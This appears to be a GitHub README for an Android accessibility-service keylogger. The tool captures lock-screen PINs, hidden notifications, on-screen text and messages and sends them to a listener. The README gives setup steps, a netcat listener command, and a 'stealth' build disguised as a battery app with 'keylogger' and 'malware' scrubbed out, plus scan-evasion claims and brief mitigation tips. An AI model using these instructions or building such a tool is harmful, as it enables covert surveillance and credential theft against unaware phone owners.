![GitHub all releases](https://img.shields.io/github/downloads/kreabyte/Pounce-Keys/total) ![GitHub commit activity](https://img.shields.io/github/commit-activity/y/kreabyte/Pounce-Keys) ![GitHub](https://img.shields.io/github/license/kreabyte/Pounce-Keys) ![Snyk Vulnerabilities for GitHub Repo](https://img.shields.io/snyk/vulnerabilities/github/kreabyte/Pounce-Keys) [![Hits](https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2FKreaByte%2Fpounce-keys&count_bg=%237E2676&title_bg=%23555555&icon=&icon_color=%23E7E7E7&title=Views&edge_flat=false)](https://hits.seeyoufarm.com)

# android-keylogger java listener update!
![Screenshot 2023-01-24 232719](https://user-images.githubusercontent.com/28081004/214481086-70f933da-e438-4ee8-9a41-b7de22a4b58a.png)
note that it may print logs in all tabs at times but the filter works.
this is not perfect but i did my best to sort some of the output because at first it printed 1 letter per row reading
t
t
e
s
t
test
but even worse, so i coded these tabs to wait for a certain word like "Signal" from the logs tab then apend to signal tab then
  it trys to stop printing in signal tab when it reads keyboard hidden or recent apps to stop the filter.
   its not perfect but the sorting these tabs do is a huge help in saving time reading logs.
    its designed to stop printing in certain tabs when the keyboard closes but its not perfect and it will print in all tabs
     at times but the filters will still work, this is 100 times better than just the logs tab, if youre logs are not showing just wait
      up to 2 mins. during testing MOST keys stay in their respective tabs. may try to edit the filter some more.

# Listener Features

✅ reads hidden notifications in locked state

✅ grabs almost all text on the screen the user is looking at.

✅ filtered tabs for different apps to reduce logs for easy reading (it does its best and 100 times better than straight logs, see for youreself

✅ 200 lines of error free custom code 

✅ gets pin code

✅ auto scrolling

✅ works in windows and linux as a .exe, .java, and .jar

✅ asks user for ip and port with autofill (double check correct ip and port)

✅ cute cat icon 




# works on lock screen
![Screenshot_20230121_091918](https://user-images.githubusercontent.com/28081004/213873094-bc139731-67c2-4190-af5d-c57d3b4bdf6f.png)

no need to build ip or port into apk before install

project was originally built in a AIDE (mobile app dev) using an old 2.2 Gradle build on max API 21 (things are just thrown everywhere right now, I'll clean it up if there's any company, enjoy :)

this version was built in android studio electric eel 2022.1.1 with Gradle updated to 7.6 and API all the way up to 33 (android 13) you can use any listener
just thought the theme was cool.

More than just a keylogger, this app prints most text in whatever active section was tapped or opened/viewed, this is how it can show recieved messages.
think of this as a text based VNC as it sends all that is tapped on the phone


# STEALTH

due to new security features android API 29 and above (Oreo and up I believe) it will make it hard to near impossible to hide the app without root.
The stealth version does not allow the app to be open, just a white icon, and it just opens the app details menu, sits in the app drawer.

In stealth, you must make and place your own fix.dat file in the app directory 
Android/data/com.BatteryHealth/files/key/fix.dat
after making fix.dat inside, add "192.168.0.135:4444"
without the quotes and replace IP and port with your own IP:PORT

this option has removed all words "keylogger" and "malware" from UI and code as well as folders and hides the app 100% except settings installed list in
android BELLOW Oreo, API 29 and up it will just open app info not showing the IP port field

![Screenshot_20230121_092852](https://user-images.githubusercontent.com/28081004/213873696-b7104b3c-7a17-46a5-a80d-11af8cfee183.png)
![Screenshot_20230121_092759](https://user-images.githubusercontent.com/28081004/213873716-8d0265db-4b4a-443f-8749-7549fa4f2f48.png)

# Virus Total
normal APK hash b8c49cb5d9e931a2f25898c74a729fe642d725ab9b7878b39a7b46f9fa9e02f5 (you can search by hash, 3 hits)

stealth APK hash aab9a81cb74ee778cfdbbc1ff06d9fb4df04a03752cceb50afc3aee39e7aa5f5 

- [X] PASSED GOOGLE VIRUS SCAN, 2 hits

# NORMAL INSTALL

open the app and just place your IP:PORT and tap send (the ip of the device you will listen on, ie my java listener or netcat with -k switch)
you may need to open settings/apps/app-name then tap 3 dots top right and allow special permissions
make sure where you got the file from via web browser and or file manager has access,ES works if you have problems
open accessibility settings and enable keylogger or BatteryHealth
no manual fix.dat required



# VIEWING LOGS
![Screenshot 2023-01-25 001403](https://user-images.githubusercontent.com/28081004/214485413-54df17f6-7478-4d15-bbe0-da02d2d3618d.png)
new updated logger with gui

see and record each key press in real time
open net cat and do


for windows, use net cat 5.59 beta
.\ncat.exe -klvp 4444

just tells net cat to listen on port 4444 and not close

for java just download the listener in release and type javac MessageListener.java then java MessageListener

enjoy!



# ARE YOU'RE APPS VULNERABLE? TEST THEM NOW! Example even CalyxOS lock-sceen is vulnerable, fennec's browser URL tab is protected but not web pages.
Here is an example of a captured lock screen passcode 1337 and the garbled text is the dots temporarily shown, but it still grabbed it.
![Screenshot_20230121_092116](https://user-images.githubusercontent.com/28081004/213873317-abffd551-46c0-44c6-a427-b0c6fe9051c4.png)

# dev
make a new android studio project, empty
file, open downloaded extracted project in new window
right click on each project to open each in file explorer
in you're new project open app\src\main and delete 
copy over the rev, java, main files from the forked project over to this folder
![Screenshot 2023-01-21 180954](https://user-images.githubusercontent.com/28081004/213893930-3418400c-9c51-4f36-ba56-bca8ffe9c223.png)

# mitigations

can I protect my passwords from this, even while hacked?
Open dev options and under privacy turn off show passwords when typed

how do I look for this

open accessibility settings and see if anything is on or just present, check installed apps in settings
on API 29 and above (Oreo) it cannot fully hide the app from the launcher but stealth version shows white icon then only opens up app info
check app folders in android for a key folder or a fix.dat file




# Donate

I'm very excited to announce this is my first app coded and built in AS and first GitHub project, seeing this here alone was worth it, I seen i got
5 downloads and went to tidy this up a little bit I got so excited. Please leave a star if you like this project, would love to move up in the
android-keylogger tag :) enjoy

If you've found my work to be valuable, I would greatly appreciate your support, Leave a star. Every little bit helps and allows me to keep creating and improving. Thank you for your consideration and support!

<a href="https://www.buymeacoffee.com/KreaByte"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee <3&emoji=&slug=KreaByte&button_colour=BD5FFF&font_colour=ffffff&font_family=Comic&outline_colour=000000&coffee_colour=FFDD00" /></a>

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/X8X6I1K9I)

# credits
forked from https://github.com/shivamsuyal/Android-Keylogger

icon "https://www.flaticon.com/free-icon/keylogger_8147179?term=keylogger&page=1&position=42&origin=search&related_id=8147179
https://www.flaticon.com/free-icon/hacking_2431702?related_id=2431702&origin=search
      
   https://www.freepik.com/free-vector/cute-cat-computer-with-mouse-cartoon-vector-icon-illustration-animal-technology-icon-concept-isolated-premium-vector-flat-cartoon-style_18537569.htm#query=cat%20keyboard&position=1&from_view=search&track=sph#position=1&query=cat%20keyboard
https://www.freepik.com/free-vector/chat-bot-mobile-chatting-isometric-concept_6342161.htm


